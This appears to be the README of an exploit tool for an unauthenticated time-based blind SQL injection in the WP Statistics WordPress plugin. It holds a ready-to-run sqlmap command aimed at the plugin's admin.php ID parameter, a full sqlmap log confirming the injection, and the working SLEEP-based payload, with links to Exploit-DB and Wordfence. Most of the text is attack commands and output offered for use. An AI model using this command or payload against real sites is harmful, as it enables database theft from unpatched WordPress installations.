# WP-Statistics-BlindSQL
WordPress Plugin WP Statistics 13.0.7 - Time-Based Blind SQL Injection (Unauthenticated)
# Usage:
```
(+) WP-statistical Plugin Version = 13.0.6
(+) wp.site.com Target is vuln!
(+) Try payload
(+) WwoowowoW maybe vuln ;)
Try: sqlmap -u "https://wp-site.com/wp-admin/admin.php?ID=1&page=wps_pages_page&type=1" --technique=T --dbms="mysql" -p "ID" -b --level=5 --time-sec=10 --dbs
```
```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.12.45#dev}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:42:39 /2021-05-25/

[04:42:40] [INFO] testing connection to the target URL
[04:42:42] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[04:42:42] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:42:42] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
are you sure that you want to continue with further target testing? [Y/n] y
[04:42:45] [WARNING] please consider usage of tamper scripts (option '--tamper')
[04:42:45] [WARNING] heuristic (basic) test shows that GET parameter 'ID' might not be injectable
[04:42:45] [INFO] testing for SQL injection on GET parameter 'ID'
[04:42:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:42:45] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)
[04:43:14] [INFO] GET parameter 'ID' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n] y
[04:43:29] [INFO] checking if the injection point on GET parameter 'ID' is a false positive
GET parameter 'ID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 65 HTTP(s) requests:
---
Parameter: ID (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ID=1 AND (SELECT 8471 FROM (SELECT(SLEEP(10)))PoaG)&page=wps_pages_page&type=1
---
[04:49:24] [INFO] the back-end DBMS is MySQL
```
# Reference:
- https://www.exploit-db.com/exploits/49894
- https://www.wordfence.com/blog/2021/05/over-600000-sites-impacted-by-wp-statistics-patch/
